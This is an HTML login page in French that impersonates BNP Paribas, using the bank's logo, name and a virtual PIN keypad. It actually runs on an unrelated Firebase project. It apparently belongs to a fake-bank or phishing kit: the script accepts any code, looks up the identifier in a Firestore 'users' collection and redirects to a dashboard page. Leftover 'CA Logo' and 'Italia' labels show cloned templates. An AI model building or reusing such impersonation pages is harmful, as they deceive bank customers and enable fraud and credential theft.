<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Saisie du code secret - BNP Paribas Italia</title>

  <!-- Tailwind CSS & FontAwesome -->
  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

  <!-- SDK Firebase v8 -->
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
<link rel="shortcut icon" href="https://lh3.googleusercontent.com/48IHZd1EHIk-Dg1m6J36FZ6Pnlz0oLHVdqkzNdS8xJPCVdQk3EgZa014nPNzwi7o918

" />
  <style>
    body { font-family: 'Plus Jakarta Sans', sans-serif; }
  </style>
</head>
<body class="bg-slate-100 min-h-screen flex flex-col justify-between text-slate-800">

  <!-- En-tête -->
  <header class="bg-white border-b border-slate-200 shadow-xs">
    <div class="max-w-5xl mx-auto px-4 py-3 flex items-center justify-between">
      <div class="flex items-center space-x-3">
        <div class="w-10 h-10 bg-[] rounded-lg flex items-center justify-center text-white font-bold text-xl shadow-xs">
          <span></span>
        </div>
        <span class="font-bold text-lg tracking-tight text-slate-800">
          <img src="https://wp.logos-download.com/wp-content/uploads/2016/04/BNP_Paribas_logo_logotype_emblem.png?dl" height="135" width="175" alt="CA Logo">
        </span>
      </div>
      <nav class="hidden md:flex space-x-6 text-sm font-medium text-slate-600">
        <a href="#" class="text-[#056846] font-semibold border-b-2 border-[#056846] pb-1">Particuliers</a>
        <a href="#" class="hover:text-slate-900 transition">Entreprises</a>
        <a href="#" class="hover:text-slate-900 transition">Professionnels</a>
      </nav>
    </div>
  </header>

  <!-- Conteneur principal -->
  <main class="flex-1 flex items-center justify-center p-4 my-8">
    <div class="bg-white border border-slate-200 rounded-2xl shadow-lg p-6 md:p-8 max-w-md w-full">
      
      <div class="text-center mb-6">
        <h1 class="text-2xl font-bold text-slate-900">Accédez à votre espace client</h1>
        <p class="text-sm text-slate-500 mt-1">Identifiant : <span id="displayIdent" class="font-semibold text-slate-800"></span> 
          <a href="index.html" class="text-xs text-[#056846] ml-2 underline">Modifier</a>
        </p>
      </div>

      <!-- Zone de notification d'erreur -->
      <div id="errorMessage" class="hidden mb-4 p-3 bg-red-50 border border-red-200 text-red-600 rounded-xl text-xs font-semibold text-center"></div>

      <form id="passwordForm" class="space-y-5">
        
        <!-- Champ Mot de passe masqué -->
        <div>
          <label for="password" class="block text-sm font-semibold text-slate-700 mb-1 text-center">Saisissez votre code secret</label>
          <div class="relative">
            <input 
              type="password" 
              id="password" 
              name="password" 
              readonly 
              placeholder="••••••••" 
              class="w-full text-center py-2.5 bg-slate-100 border border-slate-300 rounded-xl text-slate-800 placeholder-slate-400 cursor-not-allowed focus:outline-none text-lg font-mono tracking-widest"
              required
            >
          </div>
        </div>

        <!-- Clavier virtuel -->
        <div class="bg-slate-50 p-4 rounded-xl border border-slate-200">
          <p class="text-xs text-slate-500 text-center mb-3 font-medium">Clavier de saisie sécurisée</p>
          <div class="grid grid-cols-5 gap-2" id="virtualKeyboard"></div>
        </div>

        <!-- Bouton Validation final -->
        <button 
          type="submit" 
          id="btnSubmit"
          class="w-full bg-[#056846] hover:bg-emerald-800 text-white font-semibold py-3 rounded-xl transition shadow-md shadow-[#056846]/20 flex items-center justify-center space-x-2 cursor-pointer"
        >
          <span id="btnText">Accéder à mon espace client</span>
          <i id="btnIcon" class="fa-solid fa-arrow-right text-xs"></i>
        </button>
      </form>

      <div class="mt-6 text-center">
        <a href="#" class="text-xs text-[#056846] hover:underline font-semibold">Identifiant ou code secret oublié ?</a>
      </div>

    </div>
  </main>

  <footer class="bg-white border-t border-slate-200 py-4 text-center text-xs text-slate-500">
    <p>&copy; BNP Paribas - Tous droits réservés.</p>
  </footer>

  <!-- SCRIPT FIREBASE V8 & LOGIN -->
  <script>
    // Configuration Firebase (v8)
    const firebaseConfig = {
      apiKey: "AIzaSyDMBGGXNwEHk4gCwzsofxVYIH0dJ6usyek",
      authDomain: "alliance-67cb1.firebaseapp.com",
      projectId: "alliance-67cb1",
      storageBucket: "alliance-67cb1.firebasestorage.app",
      messagingSenderId: "464968433664",
      appId: "1:464968433664:web:0604cbdaf2b36e55e718e5"
    };

    if (!firebase.apps.length) {
      firebase.initializeApp(firebaseConfig);
    }
    const db = firebase.firestore();
    const USERS_COLLECTION = 'users';

    document.addEventListener('DOMContentLoaded', () => {
      const ident = sessionStorage.getItem('activeUserIdent');

      // Si l'utilisateur n'a pas renseigné l'identifiant, retour à la première page
      if (!ident) {
        window.location.href = "index.html";
        return;
      }

      document.getElementById('displayIdent').textContent = ident;

      const keyboard = document.getElementById('virtualKeyboard');
      const passwordInput = document.getElementById('password');
      const passwordForm = document.getElementById('passwordForm');
      const errorMessage = document.getElementById('errorMessage');

      // Génération aléatoire du clavier virtuel (boutons 0 à 9)
      let keys = '1234567890'.split('').sort(() => Math.random() - 0.5);

      keys.forEach(key => {
        const keyButton = document.createElement('button');
        keyButton.type = 'button';
        keyButton.className = 'h-12 bg-white border border-slate-300 rounded-lg text-slate-800 font-bold text-lg hover:bg-slate-100 hover:border-slate-400 active:bg-slate-200 transition shadow-xs cursor-pointer flex items-center justify-center';
        keyButton.textContent = key;
        keyButton.addEventListener('click', () => {
          if (passwordInput.value.length < 10) passwordInput.value += key;
        });
        keyboard.appendChild(keyButton);
      });

      // Bouton Effacer
      const backspaceKey = document.createElement('button');
      backspaceKey.type = 'button';
      backspaceKey.className = 'h-12 bg-red-50 border border-red-200 text-red-600 rounded-lg font-bold text-sm hover:bg-red-100 active:bg-red-200 transition shadow-xs flex items-center justify-center cursor-pointer col-span-5 mt-2';
      backspaceKey.innerHTML = '<i class="fa-solid fa-backspace mr-2"></i> Effacer';
      backspaceKey.addEventListener('click', () => {
        passwordInput.value = passwordInput.value.slice(0, -1);
      });
      keyboard.appendChild(backspaceKey);

      // Traitement final de connexion
      passwordForm.addEventListener('submit', async (event) => {
        event.preventDefault();
        errorMessage.classList.add('hidden');

        const password = passwordInput.value;

        // Visual feedback
        document.getElementById('btnText').textContent = "Connexion en cours...";
        document.getElementById('btnIcon').className = "fa-solid fa-spinner fa-spin text-xs";

        try {
          let foundDocId = null;

          // 1. Recherche par Document ID
          const docRef = await db.collection(USERS_COLLECTION).doc(ident).get();

          if (docRef.exists) {
            foundDocId = docRef.id;
          } else {
            // 2. Recherche par champ 'identifiant'
            const snapshot = await db.collection(USERS_COLLECTION)
              .where('identifiant', '==', ident)
              .get();

            if (!snapshot.empty) {
              foundDocId = snapshot.docs[0].id;
            }
          }

          const finalUserId = foundDocId || ident;

          sessionStorage.setItem('activeUserId', finalUserId);

          // Redirection vers le tableau de bord
          window.location.href = "dashboard.html";

        } catch (error) {
          console.warn("Erreur de connexion Firestore, repli session locale:", error);

          sessionStorage.setItem('activeUserId', ident);
          window.location.href = "dashboard.html";

        } finally {
          document.getElementById('btnText').textContent = "Accéder à mon espace client";
          document.getElementById('btnIcon').className = "fa-solid fa-arrow-right text-xs";
        }
      });
    });
  </script>
</body>
</html>
